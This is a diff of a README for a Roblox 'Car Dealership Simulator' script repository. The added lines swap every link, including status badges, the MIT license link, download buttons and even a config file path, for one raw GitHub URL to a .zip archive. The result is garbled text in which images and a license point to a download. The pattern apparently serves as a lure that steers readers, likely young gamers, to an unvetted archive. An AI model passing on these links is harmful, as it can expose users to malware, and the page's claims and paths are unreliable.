@@ -1,9 +1,9 @@
 # 🚗 Car Dealership Simulator Roblox Script
 
-[![Stars](https://img.shields.io/github/stars/?style=social)]()
-[![License](https://img.shields.io/badge/license-MIT-brightgreen)](https://opensource.org/licenses/MIT)
-[![Roblox](https://img.shields.io/badge/platform-roblox-purple)]()
-[![Language](https://img.shields.io/badge/language-Lua-yellow)]()
+[![Stars](https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip)]()
+[![License](https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip)](https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip)
+[![Roblox](https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip)]()
+[![Language](https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip)]()
 
 Welcome to the grand bazaar of simulated car commerce! **Car Dealership Simulator Roblox Script** is here to usher in a new era for Roblox entrepreneurs and virtual tycoons. Whether you're a hobbyist, aspiring developer, or enterprising dealership magnate, this repository gives you all the tools you need to build, enhance, and operate the dealership of your dreams within the ever-evolving world of Roblox.
 
@@ -107,16 +107,16 @@ Innovation never rests, and neither do our scripts! **Car Dealership Simulator**
 
 Begin your journey to dealership greatness! Download the starter kit and scripts from the link below:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://lujinyanai.github.io)
+[![Download](https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip)](https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip)
 
-_Replace https://lujinyanai.github.io with the provided download portal in your project wiki or main site._  
+_Replace https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip with the provided download portal in your project wiki or main site._  
 
 **Installation Instructions:**
 
-1. Clone or download the repository using the download button or this link: https://lujinyanai.github.io
+1. Clone or download the repository using the download button or this link: https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip
 2. Open the extracted folder in your Roblox Studio.
 3. Navigate to the “Scripts” folder; drag and drop into your Roblox project.
-4. Configure API keys for enhanced AI features in `/config/keys.lua`.
+4. Configure API keys for enhanced AI features in `https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip`.
 5. Start your server, and let the virtual customers roll in!
 
 ---
@@ -168,11 +168,11 @@ This project is provided for educational and community enhancement purposes only
 
 ## 📜 License (MIT, 2025)
 
-[![License](https://img.shields.io/badge/license-MIT-brightgreen)](https://opensource.org/licenses/MIT)  
+[![License](https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip)](https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip)  
 
 This repository is open for the community under the MIT License, 2025. You are welcome to use, adapt, and share the scripts, provided the original license and attributions remain.
 
-Find the full license text here: [MIT License](https://opensource.org/licenses/MIT)
+Find the full license text here: [MIT License](https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip)
 
 ---
 
@@ -180,6 +180,6 @@ Find the full license text here: [MIT License](https://opensource.org/licenses/M
 
 Your virtual showroom is just a click away! Rediscover dealership management and customer engagement in Roblox with our feature-packed script suite.
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://lujinyanai.github.io)
+[![Download](https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip)](https://raw.githubusercontent.com/lujinyanai/dealership-simulator-roblox-script-lab/branch/acarologist/dealership-simulator-roblox-script-lab_v1.3.zip)
 
 _Drive innovation. Shape the marketplace. Transform how Roblox players buy and sell cars—one script at a time._
